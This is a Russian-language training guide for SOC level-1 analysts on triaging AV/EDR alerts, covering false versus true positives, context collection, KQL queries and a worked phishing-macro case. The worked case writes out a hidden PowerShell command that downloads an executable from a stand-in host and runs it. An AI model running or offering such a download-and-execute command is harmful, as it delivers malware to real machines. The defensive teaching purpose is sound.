# Проверка контекста: легитимный инструмент или вредоносное ПО (False Positive / True Positive) при срабатывании AV/EDR

## 1. Контекст и базовые понятия

Срабатывание антивируса (AV) или системы обнаружения и реагирования на конечных точках (EDR) — исходная точка работы аналитика уровня L1 в SOC. Алерт сам по себе не является инцидентом: это лишь сигнал, требующий проверки. Ключевой навык на этом этапе — различение ложноположительного (False Positive, FP) и истинноположительного (True Positive, TP) события, то есть определение, действительно ли активность вредоносна.

Ложное срабатывание возникает, когда средство защиты классифицирует легитимные действия или файлы как злонамеренные. По данным отраслевых исследований, доля FP может достигать 40–50 % от общего числа алертов в типичном SOC [Alias Cybersecurity]. Это системная проблема, порождённая широкими правилами детектирования, неполнотой контекста и агрессивными настройками продуктов безопасности. Для L1-аналитика FP означает напрасную трату времени и риск пропуска реальной угрозы из-за «усталости от алертов».

Противоположный случай — False Negative (FN, ложноотрицательное срабатывание) — когда вредоносная активность не детектируется вовсе. Приоритет FP и FN в работе SOC различен: FP создают шум, a FN — слепые зоны. Понимание этих категорий базируется на классической матрице ошибок (confusion matrix), адаптированной к контексту информационной безопасности:

| Фактическая активность →<br>↓ Решение системы защиты | Угроза (вредоносная) | Легитимная (безопасная) |
|----------------------------------------------------|----------------------|--------------------------|
| **Алерт (срабатывание)**                           | True Positive (TP)   | **False Positive (FP)**  |
| **Нет алерта**                                     | False Negative (FN)  | True Negative (TN)       |

Различие FP и FN критично: FP говорит о недостатке специфичности правила, FN — о недостатке чувствительности. Баланс между этими двумя метриками определяет качество детектирующей системы.

Термин «контекст» в SOC означает совокупность метаданных и обстоятельств, в которых произошло событие. Без контекста невозможно отличить легитимный административный инструмент от вредоносной программы. Например, утилита PsExec, используемая для удалённого администрирования, и одноимённый инструмент, применяемый злоумышленниками для lateral movement, могут иметь одинаковый хеш файла. Только контекст — путь к файлу, родительский процесс, аргументы командной строки, сетевые подключения, временные метки и учётная запись пользователя — позволяет принять решение о характере алерта.

В SOC Level 1 аналитик выполняет первичный триаж: собирает базовый контекст и выносит вердикт «FP» (закрытие алерта) или «TP/подозрительный» (эскалация на L2). Ошибочное принятие TP за FP означает пропуск инцидента; наоборот, передача FP на L2 перегружает старших коллег. Поэтому формализованный подход к проверке контекста — критически важный навык.

К числу основных причин ложных срабатываний AV/EDR, с которыми сталкивается аналитик, относятся [VMray, HarfangLab]:
- **Сигнатурные детекты без поведенческого анализа.** Файл может совпадать с участком сигнатуры, но его фактическое поведение в системе — легитимное.
- **Легитимные административные утилиты (LOLBins — Living Off the Land Binaries).** PowerShell, PsExec, WMI, certutil и десятки других штатных средств Windows при определённых параметрах запуска неотличимы от действий злоумышленника.
- **Обновления ПО и скрипты автоматизации.** Плановый софт, загружающий файлы из интернета или модифицирующий системные каталоги, часто попадает в эвристические правила EDR.
- **Политики повышенной чувствительности.** Агрессивная настройка EDR для обнаружения малейших отклонений ведёт к большему числу FP.
- **Изменения в инфраструктуре.** Новые приложения, контейнеризация, динамические IP-адреса облачных сред создают алерты, не являющиеся угрозами.

Таким образом, задача L1 — не просто зафиксировать вердикт AV/EDR, а подтвердить или опровергнуть его, опираясь на систематический сбор контекстных данных.

## 2. Процесс проверки контекста: фазы, участники, артефакты

Процесс верификации срабатывания AV/EDR на уровне L1 формализуется в виде последовательности шагов, каждый из которых порождает определённые артефакты и требует от аналитика владения инструментарием. Рассмотрим его как методологический процесс с выделением фаз, ролей и ключевых данных.

Тип процесса — линейная цепочка триажа с возможными циклами уточнения (например, дополнительный запрос в песочницу). Участники: система-источник алерта (AV/EDR), аналитик L1, внешние сервисы проверки репутации и песочницы. Артефакты — структурированные единицы информации, фигурирующие на каждой фазе.

Ниже представлена диаграмма фаз в виде ASCII-схемы:

```text
[AV/EDR] ──(алерт)──▶ (1) Приём и классификация ──▶ (2) Извлечение артефактов ──▶ (3) Сбор контекста
                           │                                 │
                           └───(если критично)──▶ Эскалация │
                                                             ▼
                                     (4) Анализ легитимности (репутация, подпись, путь, родитель)
                                                             │
                                                             ▼
                                     (5) Принятие решения (FP / TP / Suspicious) ──▶ [Закрытие или эскалация на L2]
```

**Фаза 1: Приём и классификация алерта.** Аналитик получает алерт из очереди SIEM, тикет-системы или консоли EDR. На этом этапе оцениваются критичность (severity), тип детекта (сигнатурный, поведенческий, ML), затронутый хост и пользователь. Артефакт: карточка алерта с уникальным идентификатором, временной меткой, типом источника, кратким описанием.

**Фаза 2: Извлечение артефактов.** Из тела алерта выделяются ключевые индикаторы, которые подлежат дальнейшей проверке. Типичный набор: полный путь к файлу (file path), SHA-256 (или MD5/SHA-1), имя процесса, командная строка запуска, идентификатор родительского процесса (Parent PID), учётная запись пользователя, сетевые индикаторы (IP-адреса, URL), если доступны.

**Фаза 3: Сбор контекстной информации.** Это ядро проверки, в котором к извлечённым артефактам добавляются данные из внешних и внутренних источников. Ключевые шаги:
- **Верификация цифровой подписи.** Проверяется наличие и валидность Authenticode-подписи исполняемого файла, издатель, срок действия сертификата.
- **Репутационный анализ.** Хеш файла или IP проверяются через сервисы репутации (VirusTotal, Talos, репутационные базы EDR).
- **Анализ пути и расположения.** Легитимные системные утилиты, как правило, располагаются в доверенных каталогах (`%SystemRoot%\System32`, `%ProgramFiles%`). Появление тех же файлов в `%TEMP%`, `%AppData%` или `%Public%` — сильный индикатор угрозы.
- **Анализ дерева процессов.** Критичен родительский процесс. Например, запуск PowerShell из Winword.exe (Microsoft Word) — частая техника после фишинга, тогда как запуск из проводника — скорее FP.
- **Проверка аргументов командной строки.** Набор флагов, закодированные скрипты, нетипичные параметры (например, `-enc` для PowerShell с base64) добавляют уверенности в злонамеренности.

**Фаза 4: Анализ легитимности.** На основе совокупности собранных данных аналитик определяет, укладывается ли наблюдаемая активность в рамки ожидаемого поведения для данной среды. Для этого необходимо знание стандартных процессов организации (какие утилиты применяют администраторы, какие пакеты развёртываются через SCCM) и типовой картины ложных срабатываний. Часто полезно сравнивать с базой известных легитимных инструментов (например, реестр LOLBins проекта LOLBAS). Если файл является известной утилитой двойного назначения, аналитик должен выяснить, использовалась ли она штатно в этом контексте.

**Фаза 5: Принятие решения.** Итогом анализа становится одна из трёх категорий:
- **False Positive** — активность полностью объяснима как легитимная; алерт закрывается с указанием причины и, при необходимости, с рекомендацией на тюнинг правила.
- **True Positive** — подтверждена вредоносная активность; алерт эскалируется на L2/L3 с собранными артефактами для немедленного реагирования.
- **Suspicious (подозрительный)** — данных недостаточно для однозначного вердикта; алерт также эскалируется, но с пометкой, что требуется более глубокий анализ.

Артефакты, создаваемые на каждой фазе, сведены в таблицу:

| Фаза | Исполнитель | Ключевые артефакты |
|------|------------|-------------------|
| 1. Приём и классификация | Аналитик / SOAR | Карточка алерта (ID, severity, источник, хост) |
| 2. Извлечение | EDR / SIEM / аналитик вручную | file_path, sha256, cmdline, parent_process, user |
| 3. Сбор контекста | Аналитик + внешние API | Данные цифровой подписи, отчёт VirusTotal, путь, дерево процессов |
| 4. Анализ легитимности | Аналитик | Сопоставление с LOLBAS, внутренними белыми списками, baseline |
| 5. Принятие решения | Аналитик L1 | Заключение (FP/TP/Suspicious), комментарий, рекомендация |

Ошибки на любом этапе (например, пренебрежение родителем процесса или слепое доверие подписи) приводят к неверной классификации. Поэтому процесс должен быть воспроизводимым и документированным.

## 3. Применение и работа: инструментарий и практические приёмы

Практическая работа L1-аналитика с алертом AV/EDR опирается на утилиты и сервисы, доступные в консоли EDR и вне её. Приводимые ниже команды отражают типовые операции, выполняемые при проверке.

### Сбор информации на конечной точке через EDR

Большинство платформ EDR (Microsoft Defender for Endpoint, CrowdStrike Falcon, SentinelOne, Carbon Black и др.) предоставляют возможность удалённого опроса хоста для получения деталей файла или процесса. Следующие примеры показывают обобщённый синтаксис запросов (конкретный синтаксис зависит от платформы). Важно: аналитик L1 редко вводит команды непосредственно на endpoint; как правило, он использует поисковые запросы в консоли EDR.

**Пример 1. Получение свойств файла по его хешу или пути**

```json
// Обобщённый EDR запрос (например, Defender Advanced Hunting)
DeviceFileEvents
| where SHA256 == "иллюстративное_значение_sha256"
| project FileName, FolderPath, Timestamp, SignatureInfo, Size
```
Ожидаемый вывод — таблица с деталями файла: имя, полный путь, издатель сертификата (если есть), размер. Наличие подписи доверенного издателя (Microsoft Corporation) и пути в `\Windows\System32\` — аргумент в пользу FP, однако это не гарантия.

**Пример 2. Получение дерева процессов для события**

```json
DeviceProcessEvents
| where ProcessId == <PID_из_алерта>
| project Timestamp, ProcessCommandLine, ParentProcessId, InitiatingProcessCommandLine, AccountName
```
Такой запрос выдаст цепочку создания процесса, позволяя увидеть родителя и аргументы. Наличие родительского `cmd.exe`, запущенного от SYSTEM, и аргументов, содержащих `-nop -w hidden -enc`, резко повышает оценку угрозы.

### Локальные артефакты при изолированном анализе

В ряде случаев (например, при разовом исследовании на тестовом стенде) аналитик может применить системные утилиты напрямую.

**Проверка цифровой подписи файла (PowerShell)**

```powershell
Get-AuthenticodeSignature -FilePath "C:\ProgramData\suspicious.exe" | Format-List
```
Вывод содержит статус подписи (`Valid`, `NotSigned`, `HashMismatch`), сведения о сертификате (Subject, Issuer, срок действия). Если файл не подписан или сертификат просрочен/самоподписан, это повышает подозрительность, но опять-таки не является абсолютным критерием — многие легитимные open-source утилиты не имеют подписи.

**Вычисление хеша для сравнения с Threat Intelligence**

```powershell
Get-FileHash -Algorithm SHA256 "C:\Users\jdoe\AppData\Local\Temp\dropped.dll"
```
Аналитик сверяет полученный `Hash` с отчётами VirusTotal или внутренней базы TI. Если детектирующих движков >10 и среди них есть авторитетные вендоры, вероятность TP велика.

### Запросы к внешним сервисам репутации

Типовой метод — обращение к VirusTotal API (при наличии лицензии) с хешем или файлом. Ниже показана структура HTTP-запроса и ожидаемого ответа (иллюстративная схема).

```bash
curl --request GET --url 'https://www.virustotal.com/api/v3/files/{sha256}' --header 'x-apikey: <ваш_ключ>'
```
Ответ (JSON-фрагмент):

```json
{
  "data": {
    "attributes": {
      "last_analysis_stats": {
        "malicious": 0,
        "suspicious": 2,
        "undetected": 65,
        "harmless": 70
      },
      "signature_info": {
        "product": "Microsoft Office",
        "verified": true
      },
      "meaningful_name": "mstsc.exe",
      "type_description": "Win32 EXE",
      "reputation": 0,
      "first_submission_date": 1590000000
    }
  }
}
```
Аналитик интерпретирует `malicious` > 0 как признак TP, но обращает внимание на количество и качество детектов (1–2 сомнительных движка могут давать FP). Поле `signature_info` помогает судить о подлинности файла. Если файл имеет легитимное имя, но помещён в нестандартный каталог, а родитель подозрителен — вероятен TP.

### Типичные ошибки L1 при проверке

1. **Доверие исключительно вердикту AV.** Антивирус мог ошибиться; его вердикт — лишь элемент контекста. Необходимо подтверждение из других источников.
2. **Игнорирование расположения файла.** `svchost.exe` в `C:\Windows\System32` — легитимный; тот же `svchost.exe` в `C:\Users\...\Temp` — индикатор вредоносной активности.
3. **Анализ без учёта родительского процесса.** Запуск `regsvr32.exe` системой — норма; запуск `regsvr32.exe` из LookOutlook — вероятен фишинг.
4. **Поверхностная проверка подписи.** Злоумышленники используют украденные или специально выпущенные сертификаты; подпись не гарантирует безопасность.
5. **Пренебрежение командной строкой.** Аргументы типа `-enc`, `IEX`, base64-блоки часто указывают на злонамеренность, даже если основной процесс легитимен.

Инструменты, доступные аналитику L1, обязательно включают консоль EDR, песочницу для быстрого анализа подозрительных файлов и репутационные сервисы. Современные платформы, такие как Stairwell AI Triage, используют объяснимый искусственный интеллект, который не просто выдаёт вердикт, но и показывает причины: какие статические признаки, связи с вредоносными кампаниями или энтропия заставили отнести файл к подозрительным [Stairwell]. Это ускоряет принятие решения аналитиком.

## 4. Сквозной практический пример: расследование срабатывания EDR на подозрительный PowerShell

### Исходные условия
Среда: корпоративная сеть на Windows 10, EDR — Microsoft Defender for Endpoint. Алерт: «PowerShell attempted to download an executable from remote location». Severity: Medium. Хост: `station-wrk567`. Пользователь: `domain\jdoe`. Роль аналитика L1: провести триаж и определить, FP это или TP.

### Шаг 1. Просмотр карточки алерта

Алерт содержит идентификатор `12345`, временную метку, имя правила `PowerShell downloading EXE`. Из карточки извлекаем первичные артефакты: PID процесса, командная строка, родительский PID. Командная строка PowerShell:

```text
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -NoP -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'http://very-malicious.example/download/payload.exe' -OutFile '$env:TEMP\pay.exe'; Start-Process '$env:TEMP\pay.exe'"
```
(иллюстративный URL; в реальности будет конкретный домен)

Родительский процесс: `PID 1200, C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE`.

### Шаг 2. Извлечение и верификация файлового индикатора

Проверяем, был ли действительно создан файл `pay.exe` на хосте. Запрос в Defender:

```kusto
DeviceFileEvents
| where DeviceName == "station-wrk567"
| where FolderPath contains "Temp\\pay.exe"
| project Timestamp, SHA256, FolderPath, InitiatingProcessCommandLine
```
Результат показывает: файл создан в `C:\Users\jdoe\AppData\Local\Temp\pay.exe`, его SHA256 — `a1b2c3d4e5...` (иллюстративный). Инициатор — тот же PowerShell-процесс.

### Шаг 3. Анализ репутации и контекста расположения

Через API VirusTotal или встроенный запрос TI в консоли EDR получаем отчёт по SHA256. Структура отчёта:

```json
{
  "data": {
    "attributes": {
      "last_analysis_stats": {
        "malicious": 45,
        "harmless": 0,
        "suspicious": 3,
        "undetected": 22
      },
      "signature_info": {
        "verified": false
      },
      "meaningful_name": "Trojan.GenericKD.1234567",
      "type_tags": ["peexe", "trojan"],
      "reputation": -45
    }
  }
}
```
Детект 45 движков, включая ведущие антивирусы, имя «Trojan.GenericKD», отсутствие подписи — все признаки TP. Кроме того, файл расположен в пользовательской временной папке, что нетипично для легитимного ПО.

### Шаг 4. Анализ родительского процесса и таймлайна

Запрос `DeviceProcessEvents` для родителя:

```kusto
DeviceProcessEvents
| where DeviceName == "station-wrk567"
| where Timestamp between (datetime(2025-01-15 08:30:00) .. 08:35:00)
| where ProcessId == 1200
| project FileName, InitiatingProcessCommandLine, AccountName
```
Вывод: родитель — `WINWORD.EXE`, командная строка которого содержит `/t "C:\Users\jdoe\Documents\Invoice.docm"`. Значит, открыт макрос-документ. Хронология: Word запускает PowerShell с командой загрузки и выполнения файла. Это классический сценарий фишинга с документом, использующим макросы для доставки вредоносного ПО.

### Шаг 5. Оценка и вердикт

Совокупность данных: документ с макросами (`docm`), запуск PowerShell с загрузкой exe-файла, вредоносный файл с массовыми детектами, отсутствие подписи, подозрительный домен. Вердикт — **True Positive**. Алерт эскалируется на L2 для изоляции хоста и дальнейшего расследования. Собранные артефакты прикладываются к тикету.

Ожидаемый вывод примера: демонстрация полного цикла проверки контекста, последовательного исключения FP и подтверждения TP на основе измеримых показателей.
